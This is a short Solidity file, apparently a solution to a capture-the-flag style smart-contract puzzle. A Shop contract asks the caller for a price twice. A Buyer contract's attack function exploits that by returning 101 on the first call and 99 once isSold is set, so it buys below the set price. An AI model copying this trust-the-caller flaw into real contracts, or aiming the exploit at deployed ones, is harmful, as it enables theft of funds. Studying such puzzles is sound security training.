pragma solidity ^0.5.0;

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}

contract Buyer{
    
    Shop target;
    
    function attack(address _addr) public{
        target = Shop(_addr);
        target.buy();
    }
    
    function price() external view returns (uint){
        if (Shop(msg.sender).isSold() == true){
            return 99;
        }
        return 101;
    }
}